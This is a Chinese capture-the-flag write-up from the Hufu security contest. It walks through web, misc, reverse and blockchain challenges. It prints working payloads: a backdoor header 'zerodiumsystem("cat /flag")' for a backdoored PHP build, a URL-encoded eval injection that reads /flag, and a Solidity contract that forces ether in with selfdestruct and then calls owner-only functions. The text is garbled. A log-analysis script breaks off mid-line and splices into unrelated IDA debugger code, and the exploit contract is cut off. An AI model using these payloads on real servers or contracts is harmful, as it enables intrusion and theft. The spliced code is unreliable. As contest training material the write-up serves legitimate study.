# 虎符网络安全技能大赛By 天璇Merak
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## WEB
###  签到
题目来源是一个新闻，  
可以得知我们通过
    所以直接user-agentt: zerodiumsystem("cat /flag");
即可。
###  unsetme
看一下是fatfree模板  
我们下载一下源码  
可以发现如果我们传入的变量a  
unset之后就会触发
之后触发clear方法
我们在下方可以看见  
eval函数导致命令执行
之后在compile会发现有过滤  
我们构造一下正则表达即可绕过过滤
    0%0a);echo%20`cat%20/flag`;print(%27%27
得到flag
## Misc
###  你会日志分析吗
sql盲注看着时间戳就可以
    import base64
    flag=""
    with open('access.log','r') as file:
        ans = ""
        req = file.readlines()
    #print(req[52:3821])
        req=req[51:]
        for i in range(len(req)):
            if "[11/Mar/2021" in req[i]:
                if abs(int(req[i-1].split('[11/Mar/2021')[1][7:9])+60*abs((int(req[i-1].split('[11/Mar/2021')[1][5])-int(req[i].split('[11/Mar/2021')[1][5])))- int(req[i].split('[11/Mar/2021')[1][7:9]))>1.5 and abs(int(req[i-1].split('[11/Mar/2021')[1][7:9])+60*abs((int(req[i-1].split('[11/Mar/2021')[1][5])-int(req[i].split('[11/Mar/2021')[1][5])))- int(req[i].split('[11/Mar/2021')[1][7:9]))>> %s" % msg)
      def dbg_bpt(self, tid, ea):
        if ea == self.cin1_addr:
          self.reset()
        elif ea == self.cin2_addr:
          ida_dbg.set_reg_val('rip', self.after_cin2)
          rsp = ida_dbg.get_reg_val('rsp')
          idc.patch_qword(rsp+0x40, self.guess)
          self.continue_process()
        elif ea == self.chk_addr:
          ebx = ida_dbg.get_reg_val('ebx')
          eax = ida_dbg.get_reg_val('eax')
          if ebx != 80643:
            self.guess += 12379
            self.reset()
          elif eax != 1442:
            self.guess += 1
            self.reset()
          else:
            self.log(str(self.guess))
            self.continue_process()
        return 0
      def continue_process(self):
        pass
      def reset(self):
        ida_dbg.set_reg_val('rip', self.before_cin2)
        self.continue_process()
      def dbg_process_exit(self, *args):
        self.unhook()
        self.log("unhooked")
    # Install the debug hook
    debughook = MyDbgHook()
    debughook.hook()
    ida_dbg.request_start_process()
    ida_dbg.run_requests()
  * 得到num  
  * 字符串的加密与 num 无关（震惊），大概就是两次，每次都是异或加密，第一次加密后进行一次校验，校验成功后再加密第二次，第二次加密完之后又是校验，然后如果都正确的话就输出了flag
  * 第一次  
  * 第二次  
  * 于是把密钥dump出来就完事，我这里是输入了17个a，然后dump出了密文，异或一下就得到了密钥
  * 得到密钥后解密即可 
        def first():
      block = b'99038198076198076198076198076198076'
      cipher = []
      for i in [0x6594D08, 0x273, 64]:
        while i:
          cipher.append(i & 0xff)
          i >>= 8
      for i in range(7):
        a = block[i] ^ cipher[i]
        print(chr(a), end='')
    def second():
      key = [129, 244, 219, 1, 168, 7, 75, 69, 211, 87]
      for i in range(10):
        key[i] ^= ord('a')
      tmp = [0x545314AA3F8ED6B2, 0x6C6]
      cipher = []
      for i in tmp:
        while i:
          cipher.append(i & 0xff)
          i >>= 8
      for i in range(10):
        a = key[i] ^ cipher[i]
        print(chr(a), end='')
    first()
    second()
    # 1ti5K3yRC4_crypt0
## Pwn
###  AGame_给转账
题目比较简单，直接查链。  
可以获得题目逻辑
    def root(): # not payable
      owner = caller
    def _fallback(): # not payable, default function
      revert
    def unknownb8b8d35a(addr _param1): # not payable
      require owner == _param1
      require eth.balance(this.address) >= 10^15
      call caller with:
         value eth.balance(this.address) wei
           gas 2300 * is_zero(value) wei
      require ext_call.success
      stor1[_param1] = 1
看起来比较简单，成功条件是下面的函数调用成功，简单说就是unknown调用成功即可，首先需要有钱
以及是owner，那么就先selfdestruct一个过去强行转账，再加上一个 root()函数和下面函数调用即可。
PS：调大点GAS
    pragma solidity ^0.4.23;
    contract st{
        constructor() payable{
        }   
        function step1()public{
            selfdestruct(0xb4D288dE112799141064CF2Af23ab33C074863D4);
        }
    }
    contract hack{
        address target=0xb4D288dE112799141064CF2Af23ab33C074863D4;
       function step1()public{
           address(target).call(bytes4(0xebf0c717));
           address(target).call(bytes4(0xb8b8d35a),address(this));
       }
       function()payable{
           assembly{